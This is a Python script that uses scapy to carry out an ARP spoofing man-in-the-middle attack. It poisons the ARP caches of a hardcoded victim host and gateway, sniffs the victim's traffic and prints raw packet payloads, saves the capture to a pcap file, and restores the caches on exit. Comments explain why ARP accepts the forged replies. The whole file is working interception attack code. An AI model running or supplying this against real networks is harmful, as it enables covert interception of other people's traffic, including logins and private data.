from scapy.all import *
import pcapy
import sys
import os
import time
import scapy

def restoreNormal(victimIP,routerIP):
	victimMAC = MACsnag(victimIP)
	routerMAC = MACsnag(routerIP)
	send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4) 
	send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)

def MACsnag(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src
def sniffer():
	try:
		pkts = sniff(iface = "\\Device\\NPF_{CD00B2A1-A71C-468B-8ED3-AA68CDA17217}",prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
		wrpcap("temp.pcap", pkts)
	except Exception as e:
		print("Exception ",e)
	

def Spoof(routerIP, victimIP):
	victimMAC = MACsnag(victimIP)
	routerMAC = MACsnag(routerIP)

	print("Target is at ",victimMAC)
	print("Gateway is at ",routerMAC)
	#See desktop image for arp opcodes op=opcode(Size is short enum field)
	#op=1 stands for arp request, arp=2 stands for arp reply
	#Arp message format http://www.tcpipguide.com/free/t_ARPMessageFormat.htm,
	#img @ http://www.tcpipguide.com/free/diagrams/arpformat.png
	'''
	Arp has no way of checking that the ARP reply being sent was asked for or not
	It will update the arp cache of the router and victim Machine
	Note that hwsrc has been left blank, that means that will be our mac address
	Our mac address will be mapped to victim Ip in router's arp cache
	And in victim's arp cache it will be mapped to router's IP, placing us in the middle
	'''
	#Poisoning the arp cache of victim
	send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
	#Poisoning arp cache of router
	send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))

def finalattacK():
	while 1:
		try:
			Spoof("192.168.1.1","192.168.1.11")
			time.sleep(1)
			sniffer()
		except KeyboardInterrupt:
			restoreNormal("192.168.1.11","192.168.1.1")
			sys.exit(1)



if __name__ == "__main__":
    finalattacK()

